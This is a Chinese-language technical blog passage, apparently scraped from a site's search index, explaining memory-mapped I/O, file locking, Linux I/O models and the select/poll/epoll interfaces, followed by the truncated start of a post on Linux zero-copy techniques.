1-6. 用户内存到文件系统页的映射 内存映射 I/O 使用文件系统建立从用户空间直到可用文件系统页的虚拟内存映射。这样做有几个好处： 用户进程把文件数据当作内存，所以无需发布 read( )或 write( )系统调用。 当用户进程碰触到映射内存空间，页错误会自动产生，从而将文件数据从磁盘读进内存。如果用户修改了映射内存空间，相关页会自动标记为脏，随后刷新到磁盘，文件得到更新。 操作系统的虚拟内存子系统会对页进行智能高速缓存，自动根据系统负载进行内存管理。 数据总是按页对齐的，无需执行缓冲区拷贝。 大型文件使用映射，无需耗费大量内存，即可进行数据拷贝。 虚拟内存和磁盘 I/O 是紧密关联的，从很多方面看来，它们只是同一件事物的两面。在处理大量数据时，尤其要记得这一点。如果数据缓冲区是按页对齐的，且大小是内建页大小的倍数，那么，对大多数操作系统而言，其处理效率会大幅提升。 文件锁定文件锁定机制允许一个进程阻止其他进程存取某文件，或限制其存取方式。通常的用途是控制共享信息的更新方式，或用于事务隔离。在控制多个实体并行访问共同资源方面，文件锁定是必不可少的。数据库等复杂应用严重信赖于文件锁定。 “文件锁定”从字面上看有锁定整个文件的意思（通常的确是那样），但锁定往往可以发生在更为细微的层面，锁定区域往往可以细致到单个字节。锁定与特定文件相关，开始于文件的某个特定字节地址，包含特定数量的连续字节。这对于协调多个进程互不影响地访问文件不同区域，是至关重要的。 文件锁定有两种方式：共享的和独占的。多个共享锁可同时对同一文件区域发生作用；独占锁则不同，它要求相关区域不能有其他锁定在起作用。 共享锁和独占锁的经典应用，是控制最初用于读取的共享文件的更新。某个进程要读取文件，会先取得该文件或该文件部分区域的共享锁。第二个希望读取相同文件区域的进程也会请求共享锁。两个进程可以并行读取，互不影响。但是，假如有第三个进程要更新该文件，它会请求独占锁。该进程会处于阻滞状态，直到既有锁定（共享的、独占的）全部解除。一旦给予独占锁，其他共享锁的读取进程会处于阻滞状态，直到独占锁解除。这样，更新进程可以更改文件，而其他读取进程不会因为文件的更改得到前后不一致的结果。图 1-7 和图 1-8 描述了这一过程。 图 1-7. 共享锁阻断独占锁请求 图 1-8. 独占锁阻断共享锁请求 文件锁有建议使用和强制使用之分。建议型文件锁会向提出请求的进程提供当前锁定信息，但操作系统并不要求一定这样做，而是由相关进程进行协调并关注锁定信息。多数 Unix 和类Unix 操作系统使用建议型锁，有些也使用强制型锁或兼而有之。 强制型锁由操作系统或文件系统强行实施，不管进程对锁的存在知道与否，都会阻止其对文件锁定区域的访问。微软的操作系统往往使用的是强制型锁。假定所有文件锁均为建议型，并在访问共同资源的各个应用程序间使用一致的文件锁定，是明智之举，也是唯一可行的跨平台策略。依赖于强制文件锁定的应用程序，从根子上讲就是不可移植的。 八、流I/O并非所有 I/O 都像前面讲的是面向块的，也有流 I/O，其原理模仿了通道。 I/O 字节流必须顺序存取，常见的例子有 TTY（控制台）设备、打印机端口和网络连接。 流的传输一般（也不必然如此）比块设备慢，经常用于间歇性输入。多数操作系统允许把流置于非块模式，这样，进程可以查看流上是否有输入，即便当时没有也不影响它干别的。这样一种能力使得进程可以在有输入的时候进行处理， 输入流闲置的时候执行其他功能。 比非块模式再进一步，就是就绪性选择。就绪性选择与非块模式类似（常常就是建立在非块模式之上），但是把查看流是否就绪的任务交给了操作系统。操作系统受命查看一系列流，并提醒进程哪些流已经就绪。这样，仅仅凭借操作系统返回的就绪信息，进程就可以使用相同代码和单一线程，实现多活动流的多路传输。这一技术广泛用于网络服务器领域，用来处理数量庞大的网络连接。就绪性选择在大容量缩放方面是必不可少的。 同步IO和异步IO，阻塞IO和非阻塞IO分别是什么，到底有什么区别？不同的人在不同的上下文下给出的答案是不同的。所以先限定一下本文的上下文。本文讨论的背景是Linux环境下的network IO。 IO模型详解一、 概念说明在进行解释之前，首先要说明几个概念： 进程切换为了控制进程的执行，内核必须有能力挂起正在CPU上运行的进程，并恢复以前挂起的某个进程的执行。这种行为被称为进程切换。因此可以说，任何进程都是在操作系统内核的支持下运行的，是与内核紧密相关的。从一个进程的运行转到另一个进程上运行，这个过程中经过下面这些变化： 保存处理机上下文，包括程序计数器和其他寄存器。 更新PCB信息。 把进程的PCB移入相应的队列，如就绪、在某事件阻塞等队列。 选择另一个进程执行，并更新其PCB。 更新内存管理的数据结构。 恢复处理机上下文。 注：总而言之就是很耗资源 进程的阻塞正在执行的进程，由于期待的某些事件未发生，如请求系统资源失败、等待某种操作的完成、新数据尚未到达或无新工作做等，则由系统自动执行阻塞原语(Block)，使自己由运行状态变为阻塞状态。可见，进程的阻塞是进程自身的一种主动行为，也因此只有处于运行态的进程（获得CPU），才可能将其转为阻塞状态。当进程进入阻塞状态，是不占用CPU资源的。 文件描述符fd文件描述符（File descriptor）是计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。 文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。 缓存 I/O缓存 I/O 又被称作标准 I/O，大多数文件系统的默认 I/O 操作都是缓存 I/O。在 Linux 的缓存 I/O 机制中，操作系统会将 I/O 的数据缓存在文件系统的页缓存（ page cache ）中，也就是说，数据会先被拷贝到操作系统内核的缓冲区中，然后才会从操作系统内核的缓冲区拷贝到应用程序的地址空间。 缓存 I/O 的缺点：数据在传输过程中需要在应用程序地址空间和内核进行多次数据拷贝操作，这些数据拷贝操作所带来的 CPU 以及内存开销是非常大的。 二、 IO模式刚才说了，对于一次IO访问（以read举例），数据会先被拷贝到操作系统内核的缓冲区中，然后才会从操作系统内核的缓冲区拷贝到应用程序的地址空间。所以说，当一个read操作发生时，它会经历两个阶段：第一阶段：等待数据准备 (Waiting for the data to be ready)。第二阶段：将数据从内核拷贝到进程中 (Copying the data from the kernel to the process)。 对于socket流而言，第一步：通常涉及等待网络上的数据分组到达，然后被复制到内核的某个缓冲区。第二步：把数据从内核缓冲区复制到应用进程缓冲区。 网络应用需要处理的无非就是两大类问题，网络IO，数据计算。相对于后者，网络IO的延迟，给应用带来的性能瓶颈大于后者。网络IO的模型大致有如下几种：同步模型（synchronous IO） 阻塞IO（bloking IO） 非阻塞IO（non-blocking IO） 多路复用IO（multiplexing IO） 信号驱动式IO（signal-driven IO） 异步IO（asynchronous IO） 注：由于signal driven IO在实际中并不常用，所以我这只提及剩下的四种IO Model。 阻塞 I/O（blocking IO）在linux中，默认情况下所有的socket都是blocking，一个典型的读操作流程大概是这样：当用户进程调用了recvfrom这个系统调用，kernel就开始了IO的第一个阶段：准备数据（对于网络IO来说，很多时候数据在一开始还没有到达。比如，还没有收到一个完整的UDP包。这个时候kernel就要等待足够的数据到来）。这个过程需要等待，也就是说数据被拷贝到操作系统内核的缓冲区中是需要一个过程的。而在用户进程这边，整个进程会被阻塞（当然，是进程自己选择的阻塞）。当kernel一直等到数据准备好了，它就会将数据从kernel中拷贝到用户内存，然后kernel返回结果，用户进程才解除block的状态，重新运行起来。所以，blocking IO的特点就是在IO执行的两个阶段都被block了。 非阻塞 I/O（nonblocking IO）linux下，可以通过设置socket使其变为non-blocking。当对一个non-blocking socket执行读操作时，流程是这个样子：当用户进程发出read操作时，如果kernel中的数据还没有准备好，那么它并不会block用户进程，而是立刻返回一个error。从用户进程角度讲 ，它发起一个read操作后，并不需要等待，而是马上就得到了一个结果。用户进程判断结果是一个error时，它就知道数据还没有准备好，于是它可以再次发送read操作。一旦kernel中的数据准备好了，并且又再次收到了用户进程的system call，那么它马上就将数据拷贝到了用户内存，然后返回。所以，nonblocking IO的特点是用户进程需要不断的主动询问kernel数据好了没有。 I/O 多路复用（ IO multiplexing）IO multiplexing就是我们说的select，poll，epoll，有些地方也称这种IO方式为event driven IO。select/epoll的好处就在于单个process就可以同时处理多个网络连接的IO。它的基本原理就是select，poll，epoll这个function会不断的轮询所负责的所有socket，当某个socket有数据到达了，就通知用户进程。当用户进程调用了select，那么整个进程会被block，而同时，kernel会“监视”所有select负责的socket，当任何一个socket中的数据准备好了，select就会返回。这个时候用户进程再调用read操作，将数据从kernel拷贝到用户进程。 所以，I/O 多路复用的特点是通过一种机制一个进程能同时等待多个文件描述符，而这些文件描述符（套接字描述符）其中的任意一个进入读就绪状态，select()函数就可以返回。这个图和blocking IO的图其实并没有太大的不同，事实上，还更差一些。因为这里需要使用两个system call (select 和 recvfrom)，而blocking IO只调用了一个system call (recvfrom)。但是，用select的优势在于它可以同时处理多个connection。 所以，如果处理的连接数不是很高的话，使用select/epoll的web server不一定比使用multi-threading + blocking IO的web server性能更好，可能延迟还更大。select/epoll的优势并不是对于单个连接能处理得更快，而是在于能处理更多的连接。） 在IO multiplexing Model中，实际中，对于每一个socket，一般都设置成为non-blocking，但是，如上图所示，整个用户的process其实是一直被block的。只不过process是被select这个函数block，而不是被socket IO给block。 异步 I/O（asynchronous IO）linux下的asynchronous IO其实用得很少。先看一下它的流程： 用户进程发起read操作之后，立刻就可以开始去做其它的事。而另一方面，从kernel的角度，当它受到一个asynchronous read之后，首先它会立刻返回，所以不会对用户进程产生任何block。然后，kernel会等待数据准备完成，然后将数据拷贝到用户内存，当这一切都完成之后，kernel会给用户进程发送一个signal，告诉它read操作完成了。 总结blocking和non-blocking的区别调用blocking IO会一直block住对应的进程直到操作完成，而non-blocking IO在kernel还准备数据的情况下会立刻返回。 synchronous IO和asynchronous IO的区别在说明synchronous IO和asynchronous IO的区别之前，需要先给出两者的定义。POSIX的定义是这样子的： A synchronous I/O operation causes the requesting process to beblocked until that I/O operation completes; An asynchronous I/O operation does not cause the requesting process to be blocked; 两者的区别就在于synchronous IO做”IO operation”的时候会将process阻塞。按照这个定义，之前所述的blocking IO，non-blocking IO，IO multiplexing都属于synchronous IO。 有人会说，non-blocking IO并没有被block啊。这里有个非常“狡猾”的地方，定义中所指的”IO operation”是指真实的IO操作，就是例子中的recvfrom这个system call。non-blocking IO在执行recvfrom这个system call的时候，如果kernel的数据没有准备好，这时候不会block进程。但是，当kernel中数据准备好的时候，recvfrom会将数据从kernel拷贝到用户内存中，这个时候进程是被block了，在这段时间内，进程是被block的。 而asynchronous IO则不一样，当进程发起IO 操作之后，就直接返回再也不理睬了，直到kernel发送一个信号，告诉进程说IO完成（看图可以发现系统已经把数据从内核空间copy到用户空间，用户线程可以直接操作数据）。在这整个过程中，进程完全没有被block。各个IO Model的比较如图所示：通过上面的图片，可以发现non-blocking IO和asynchronous IO的区别还是很明显的。在non-blocking IO中，虽然进程大部分时间都不会被block，但是它仍然要求进程去主动的check，并且当数据准备完成以后，也需要进程主动的再次调用recvfrom来将数据拷贝到用户内存。而asynchronous IO则完全不同。它就像是用户进程将整个IO操作交给了他人（kernel）完成，然后他人做完后发信号通知。在此期间，用户进程不需要去检查IO操作的状态，也不需要主动的去拷贝数据。 三、 I/O 多路复用之select、poll、epollselect，poll，epoll都是IO多路复用的机制。I/O多路复用就是通过一种机制，一个进程可以监视多个描述符，一旦某个描述符就绪（一般是读就绪或者写就绪），能够通知程序进行相应的读写操作。但select，poll，epoll本质上都是同步I/O，因为他们都需要在读写事件就绪后自己负责进行读写，也就是说这个读写过程是阻塞的，而异步I/O则无需自己负责进行读写，异步I/O的实现会包括把数据从内核拷贝到用户空间。 select12int select (int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);12 select 函数监视的文件描述符分3类，分别是writefds、readfds、和exceptfds。调用后select函数会阻塞，直到有描述符就绪（有数据 可读、可写、或者有except），或者超时（timeout指定等待时间，如果立即返回设为null即可），函数返回。当select函数返回后，可以 通过遍历fdset，来找到就绪的描述符。 select目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点。select的一 个缺点在于单个进程能够监视的文件描述符的数量存在最大限制，在Linux上一般为1024，可以通过修改宏定义甚至重新编译内核的方式提升这一限制，但 是这样也会造成效率的降低。 poll1int poll (struct pollfd *fds, unsigned int nfds, int timeout);1 不同与select使用三个位图来表示三个fdset的方式，poll使用一个 pollfd的指针实现。 12345struct pollfd &#123; int fd; &#x2F;* file descriptor *&#x2F; short events; &#x2F;* requested events to watch *&#x2F; short revents; &#x2F;* returned events witnessed *&#x2F;&#125;;12345 pollfd结构包含了要监视的event和发生的event，不再使用select“参数-值”传递的方式。同时，pollfd并没有最大数量限制（但是数量过大后性能也是会下降）。 和select函数一样，poll返回后，需要轮询pollfd来获取就绪的描述符。 从上面看，select和poll都需要在返回后，通过遍历文件描述符来获取已经就绪的socket。事实上，同时连接的大量客户端在同一时刻可能只有很少处于就绪的状态，因此随着监视的描述符数量的增长，其效率也会线性下降。 epollepoll是在2.6内核中提出的，是之前的select和poll的增强版本。相对于select和poll来说，epoll更加灵活，没有描述符限制。epoll使用一个文件描述符管理多个描述符，将用户关系的文件描述符的事件存放到内核的一个事件表中，这样在用户空间和内核空间的copy只需一次。 四、epoll详解epoll操作过程epoll操作过程需要三个接口，分别如下： 1234&#x2F;&#x2F;创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大int epoll_create(int size)；int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);1234 int epoll_create(int size);创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大，这个参数不同于select()中的第一个参数，给出最大监听的fd+1的值，参数size并不是限制了epoll所能监听的描述符最大个数，只是对内核初始分配内部数据结构的一个建议。当创建好epoll句柄后，它就会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close()关闭，否则可能导致fd被耗尽。 int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；函数是对指定描述符fd执行op操作。- epfd：是epoll_create()的返回值。- op：表示op操作，用三个宏来表示：添加EPOLL_CTL_ADD，删除EPOLL_CTL_DEL，修改EPOLL_CTL_MOD。分别添加、删除和修改对fd的监听事件。- fd：是需要监听的fd（文件描述符）- epoll_event：是告诉内核需要监听什么事，struct epoll_event结构如下： 1234struct epoll_event &#123; __uint32_t events; &#x2F;* Epoll events *&#x2F; epoll_data_t data; &#x2F;* User data variable *&#x2F;&#125;;1234 events可以是以下几个宏的集合： 1234567EPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）；EPOLLOUT：表示对应的文件描述符可以写；EPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；EPOLLERR：表示对应的文件描述符发生错误；EPOLLHUP：表示对应的文件描述符被挂断；EPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。EPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里1234567 int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);等待epfd上的io事件，最多返回maxevents个事件。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。 epoll工作模式epoll对文件描述符的操作有两种模式：LT（level trigger）和ET（edge trigger）。LT模式是默认模式，LT模式与ET模式的区别如下： LT模式：当epoll_wait检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用epoll_wait时，会再次响应应用程序并通知此事件。 ET模式：当epoll_wait检测到描述符事件发生并将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用epoll_wait时，不会再次响应应用程序并通知此事件。 LT模式LT(level triggered)是缺省的工作方式，并且同时支持block和no-block socket.在这种做法中，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的fd进行IO操作。如果你不作任何操作，内核还是会继续通知你的。 ET模式ET(edge-triggered)是高速工作方式，只支持no-block socket。在这种模式下，当描述符从未就绪变为就绪时，内核通过epoll告诉你。然后它会假设你知道文件描述符已经就绪，并且不会再为那个文件描述符发送更多的就绪通知，直到你做了某些操作导致那个文件描述符不再为就绪状态了(比如，你在发送，接收或者接收请求，或者发送接收的数据少于一定量时导致了一个EWOULDBLOCK 错误）。但是请注意，如果一直不对这个fd作IO操作(从而导致它再次变成未就绪)，内核不会发送更多的通知(only once) ET模式在很大程度上减少了epoll事件被重复触发的次数，因此效率要比LT模式高。epoll工作在ET模式的时候，必须使用非阻塞套接口，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。 epoll工作模式总结假如有这样一个例子： 我们已经把一个用来从管道中读取数据的文件句柄(RFD)添加到epoll描述符 这个时候从管道的另一端被写入了2KB的数据 调用epoll_wait(2)，并且它会返回RFD，说明它已经准备好读取操作 然后我们读取了1KB的数据 调用epoll_wait(2)…… LT模式：如果是LT模式，那么在第5步调用epoll_wait(2)之后，仍然能受到通知。 ET模式：如果我们在第1步将RFD添加到epoll描述符的时候使用了EPOLLET标志，那么在第5步调用epoll_wait(2)之后将有可能会挂起，因为剩余的数据还存在于文件的输入缓冲区内，而且数据发出端还在等待一个针对已经发出数据的反馈信息。只有在监视的文件句柄上发生了某个事件的时候 ET 工作模式才会汇报事件。因此在第5步的时候，调用者可能会放弃等待仍在存在于文件输入缓冲区内的剩余数据。当使用epoll的ET模型来工作时，当产生了一个EPOLLIN事件后，读数据的时候需要考虑的是当recv()返回的大小如果等于请求的大小，那么很有可能是缓冲区还有数据未读完，也意味着该次事件还没有处理完，所以还需要再次读取 Linux中的EAGAIN含义Linux环境下开发经常会碰到很多错误(设置errno)，其中EAGAIN是其中比较常见的一个错误(比如用在非阻塞操作中)。 从字面上来看，是提示再试一次。这个错误经常出现在当应用程序进行一些非阻塞(non-blocking)操作(对文件或socket)的时候。 例如，以 O_NONBLOCK的标志打开文件/socket/FIFO，如果你连续做read操作而没有数据可读。此时程序不会阻塞起来等待数据准备就绪返回，read函数会返回一个错误EAGAIN，提示你的应用程序现在没有数据可读请稍后再试。 又例如，当一个系统调用(比如fork)因为没有足够的资源(比如虚拟内存)而执行失败，返回EAGAIN提示其再调用一次(也许下次就能成功)。 epoll总结在 select/poll中，进程只有在调用一定的方法后，内核才对所有监视的文件描述符进行扫描，而epoll事先通过epoll_ctl()来注册一 个文件描述符，一旦基于某个文件描述符就绪时，内核会采用类似callback的回调机制，迅速激活这个文件描述符，当进程调用epoll_wait() 时便得到通知。(此处去掉了遍历文件描述符，而是通过监听回调的的机制。这正是epoll的魅力所在。) epoll的优点主要是以下几个方面： 监视的描述符数量不受限制它所支持的FD上限是最大可以打开文件的数目，这个数字一般远大于2048,举个例子,在1GB内存的机器上大约是10万左右，具体数目可以cat /proc/sys/fs/file-max察看,一般来说这个数目和系统内存关系很大。select的最大缺点就是进程打开的fd是有数量限制的。这对于连接数量比较大的服务器来说根本不能满足。虽然也可以选择多进程的解决方案( Apache就是这样实现的)，不过虽然linux上面创建进程的代价比较小，但仍旧是不可忽视的，加上进程间数据同步远比不上线程间同步的高效，所以也不是一种完美的方案。IO的效率不会随着监视fd的数量的增长而下降。epoll不同于select和poll轮询的方式，而是通过每个fd定义的回调函数来实现的。只有就绪的fd才会执行回调函数。 如果没有大量的idle-connection或者dead-connection，epoll的效率并不会比select/poll高很多，但是当遇到大量的idle-connection，就会发现epoll的效率大大高于select/poll。","categories":[{"name":"jvm","slug":"jvm","permalink":"https://gschaos.club/categories/jvm/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Linux 中的零拷贝技术","slug":"Linux-中的零拷贝技术","date":"2020-10-25T16:00:00.000Z","updated":"2020-10-25T13:06:22.000Z","comments":true,"path":"Linux-中的零拷贝技术/","link":"","permalink":"https://gschaos.club/Linux-%E4%B8%AD%E7%9A%84%E9%9B%B6%E6%8B%B7%E8%B4%9D%E6%8A%80%E6%9C%AF/","excerpt":"","text":"Linux 中的零拷贝技术传统的 Linux 操作系统的标准 I/O 接口是基于数据拷贝操作的，即 I/O 操作会导致数据在操作系统内核地址空间的缓冲区和应用程序地址空间定义的缓冲区之间进行传输。这样做最大的好处是可以减少磁盘 I/O 的操作，因为如果所请求的数据已经存放在操作系统的高速缓冲存储器中，那么就不需要再进行实际的物理磁盘 I/O 操作。但是数据传输过程中的数据拷贝操作却导致了极大的 CPU 开销，限制了操作系统有效进行数据传输操作的能力。 零拷贝（ zero-copy ）这种技术可以有效地改善数据传输的性能，在内核驱动程序（比如网络堆栈或者磁盘存储驱动程序）处理 I/O 数据的时候，零拷贝技术可以在某种程度上减少甚至完全避免不必要 CPU 数据拷贝操作。现代的 CPU 和存储体系结构提供了很多特征可以有效地实现零拷贝技术，但是因为存储体系结构非常复杂，而且网络协议栈有时需要对数据进行必要的处理，所以零拷贝技术有可能会产生很多负面的影响，甚至会导致零拷贝技术自身的优点完全丧失。 为什么需要零拷贝技术如今，很多网络服务器都是基于客户端 - 服务器这一模型的。在这种模型中，客户端向服务器端请求数据或者服务；服务器端则需要响应客户端发出的请求，并为客户端提供它所需要的数据。随着网络服务的逐渐普及，video 这类应用程序发展迅速。当今的计算机系统已经具备足够的能力去处理 video 这类应用程序对客户端所造成的重负荷，但是对于服务器端来说，它应付由 video 这类应用程序引起的网络通信量就显得捉襟见肘了。而且，客户端的数量增长迅速，那么服务器端就更容易成为性能瓶颈。而对于负荷很重的服务器来说，操作系统通常都是引起性能瓶颈的罪魁祸首。举个例子来说，当数据“写”操作或者数据“发送”操作的系统调用发出时，操作系统通常都会将数据从应用程序地址空间的缓冲区拷贝到操作系统内核的缓冲区中去。操作系统这样做的好处是接口简单，但是却在很大程度上损失了系统性能，因为这种数据拷贝操作不单需要占用 CPU 时间片，同时也需要占用额外的内存带宽。 一般来说，客户端通过网络接口卡向服务器端发送请求，操作系统将这些客户端的请求传递给服务器端应用程序，服务器端应用程序会处理这些请求，请求处理完成以后，操作系统还需要将处理得到的结果通过网络适配器传递回去。 下边这一小节会跟读者简单介绍一下传统的服务器是如何进行数据传输的，以及这种数据传输的处理过程存在哪些问题有可能会造成服务器的性能损失。 Linux 中传统服务器进行数据传输的流程Linux 中传统的 I/O 操作是一种缓冲 I/O，I/O 过程中产生的数据传输通常需要在缓冲区中进行多次的拷贝操作。一般来说，在传输数据的时候，用户应用程序需要分配一块大小合适的缓冲区用来存放需要传输的数据。应用程序从文件中读取一块数据，然后把这块数据通过网络发送到接收端去。用户应用程序只是需要调用两个系统调用 read() 和 write() 就可以完成这个数据传输操作，应用程序并不知晓在这个数据传输的过程中操作系统所做的数据拷贝操作。对于 Linux 操作系统来说，基于数据排序或者校验等各方面因素的考虑，操作系统内核会在处理数据传输的过程中进行多次拷贝操作。在某些情况下，这些数据拷贝操作会极大地降低数据传输的性能。 当应用程序需要访问某块数据的时候，操作系统内核会先检查这块数据是不是因为前一次对相同文件的访问而已经被存放在操作系统内核地址空间的缓冲区内，如果在内核缓冲区中找不到这块数据，Linux 操作系统内核会先将这块数据从磁盘读出来放到操作系统内核的缓冲区里去。如果这个数据读取操作是由 DMA 完成的，那么在 DMA 进行数据读取的这一过程中，CPU 只是需要进行缓冲区管理，以及创建和处理 DMA ，除此之外，CPU 不需要再做更多的事情，DMA 执行完数据读取操作之后，会通知操作系统做进一步的处理。Linux 操作系统会根据 read() 系统调用指定的应用程序地址空间的地址，把这块数据存放到请求这块数据的应用程序的地址空间中去，在接下来的处理过程中，操作系统需要将数据再一次从用户应用程序地址空间的缓冲区拷贝到与网络堆栈相关的内核缓冲区中去，这个过程也是需要占用 CPU 的。数据拷贝操作结束以后，数据会被打包，然后发送到网络接口卡上去。在数据传输的过程中，应用程序可以先返回进而执行其他的操作。之后，在调用 write() 系统调用的时候，用户应用程序缓冲区中的数据内容可以被安全的丢弃或者更改，因为操作系统已经在内核缓冲区中保留了一份数据拷贝，当数据被成功传送到硬件上之后，这份数据拷贝就可以被丢弃。 从上面的描述可以看出，在这种传统的数据传输过程中，数据至少发生了四次拷贝操作，即便是使用了 DMA 来进行与硬件的通讯，CPU 仍然需要访问数据两次。在 read() 读数据的过程中，数据并不是直接来自于硬盘，而是必须先经过操作系统的文件系统层。在 write() 写数据的过程中，为了和要传输的数据包的大小相吻合，数据必须要先被分割成块，而且还要预先考虑包头，并且要进行数据校验和操作。 图 1. 传统使用 read 和 write 系统调用的数据传输 零拷贝（zero copy）技术概述什么是零拷贝？简单一点来说，零拷贝就是一种避免 CPU 将数据从一块存储拷贝到另外一块存储的技术。针对操作系统中的设备驱动程序、文件系统以及网络协议堆栈而出现的各种零拷贝技术极大地提升了特定应用程序的性能，并且使得这些应用程序可以更加有效地利用系统资源。这种性能的提升就是通过在数据拷贝进行的同时，允许 CPU 执行其他的任务来实现的。零拷贝技术可以减少数据拷贝和共享总线操作的次数，消除传输数据在存储器之间不必要的中间拷贝次数，从而有效地提高数据传输效率。而且，零拷贝技术减少了用户应用程序地址空间和操作系统内核地址空间之间因为上下文切换而带来的开销。进行大量的数据拷贝操作其实是一件简单的任务，从操作系统的角度来说，如果 CPU 一直被占用着去执行这项简单的任务，那么这将会是很浪费资源的；如果有其他比较简单的系统部件可以代劳这件事情，从而使得 CPU 解脱出来可以做别的事情，那么系统资源的利用则会更加有效。综上所述，零拷贝技术的目标可以概括如下： 避免数据拷贝 避免操作系统内核缓冲区之间进行数据拷贝操作。 避免操作系统内核和用户应用程序地址空间这两者之间进行数据拷贝操作。 用户应用程序可以避开操作系统直接访问硬件存储。 数据传输尽量让 DMA 来做。 将多种操作结合在一起 避免不必要的系统调用和上下文切换。 需要拷贝的数据可以先被缓存起来。 对数据进行处理尽量让硬件来做。 前文提到过，对于高速网络来说，零拷贝技术是非常重要的。这是因为高速网络的网络链接能力与 CPU 的处理能力接近，甚至会超过 CPU 的处理能力。如果是这样的话，那么 CPU 就有可能需要花费几乎所有的时间去拷贝要传输的数据，而没有能力再去做别的事情，这就产生了性能瓶颈，限制了通讯速率，从而降低了网络链接的能力。一般来说，一个 CPU 时钟周期可以处理一位的数据。举例来说，一个 1 GHz 的处理器可以对 1Gbit/s 的网络链接进行传统的数据拷贝操作，但是如果是 10 Gbit/s 的网络，那么对于相同的处理器来说，零拷贝技术就变得非常重要了。对于超过 1 Gbit/s 的网络链接来说，零拷贝技术在超级计算机集群以及大型的商业数据中心中都有所应用。然而，随着信息技术的发展，1 Gbit/s，10 Gbit/s 以及 100 Gbit/s 的网络会越来越普及，那么零拷贝技术也会变得越来越普及，这是因为网络链接的处理能力比 CPU 的处理能力的增长要快得多。传统的数据拷贝受限于传统的操作系统或者通信协议，这就限制了数据传输性能。零拷贝技术通过减少数据拷贝次数，简化协议处理的层次，在应用程序和网络之间提供更快的数据传输方法，从而可以有效地降低通信延迟，提高网络吞吐率。零拷贝技术是实现主机或者路由器等设备高速网络接口的主要技术之一。 现代的 CPU 和存储体系结构提供了很多相关的功能来减少或避免 I/O 操作过程中产生的不必要的 CPU 数据拷贝操作，但是，CPU 和存储体系结构的这种优势经常被过高估计。存储体系结构的复杂性以及网络协议中必需的数据传输可能会产生问题，有时甚至会导致零拷贝这种技术的优点完全丧失。在下一章中，我们会介绍几种 Linux 操作系统中出现的零拷贝技术，简单描述一下它们的实现方法，并对它们的弱点进行分析。 零拷贝技术分类零拷贝技术的发展很多样化，现有的零拷贝技术种类也非常多，而当前并没有一个适合于所有场景的零拷贝技术的出现。对于 Linux 来说，现存的零拷贝技术也比较多，这些零拷贝技术大部分存在于不同的 Linux 内核版本，有些旧的技术在不同的 Linux 内核版本间得到了很大的发展或者已经渐渐被新的技术所代替。本文针对这些零拷贝技术所适用的不同场景对它们进行了划分。概括起来，Linux 中的零拷贝技术主要有下面这几种： 直接 I/O：对于这种数据传输方式来说，应用程序可以直接访问硬件存储，操作系统内核只是辅助数据传输：这类零拷贝技术针对的是操作系统内核并不需要对数据进行直接处理的情况，数据可以在应用程序地址空间的缓冲区和磁盘之间直接进行传输，完全不需要 Linux 操作系统内核提供的页缓存的支持。 在数据传输的过程中，避免数据在操作系统内核地址空间的缓冲区和用户应用程序地址空间的缓冲区之间进行拷贝。有的时候，应用程序在数据进行传输的过程中不需要对数据进行访问，那么，将数据从 Linux 的页缓存拷贝到用户进程的缓冲区中就可以完全避免，传输的数据在页缓存中就可以得到处理。在某些特殊的情况下，这种零拷贝技术可以获得较好的性能。Linux 中提供类似的系统调用主要有 mmap()，sendfile() 以及 splice()。 对数据在 Linux 的页缓存和用户进程的缓冲区之间的传输过程进行优化。该零拷贝技术侧重于灵活地处理数据在用户进程的缓冲区和操作系统的页缓存之间的拷贝操作。这种方法延续了传统的通信方式，但是更加灵活。在 Linux 中，该方法主要利用了写时复制技术。 前两类方法的目的主要是为了避免应用程序地址空间和操作系统内核地址空间这两者之间的缓冲区拷贝操作。这两类零拷贝技术通常适用在某些特殊的情况下，比如要传送的数据不需要经过操作系统内核的处理或者不需要经过应用程序的处理。第三类方法则继承了传统的应用程序地址空间和操作系统内核地址空间之间数据传输的概念，进而针对数据传输本身进行优化。我们知道，硬件和软件之间的数据传输可以通过使用 DMA 来进行，DMA 进行数据传输的过程中几乎不需要 CPU 参与，这样就可以把 CPU 解放出来去做更多其他的事情，但是当数据需要在用户地址空间的缓冲区和 Linux 操作系统内核的页缓存之间进行传输的时候，并没有类似 DMA 这种工具可以使用，CPU 需要全程参与到这种数据拷贝操作中，所以这第三类方法的目的是可以有效地改善数据在用户地址空间和操作系统内核地址空间之间传递的效率。 Linux 中的直接 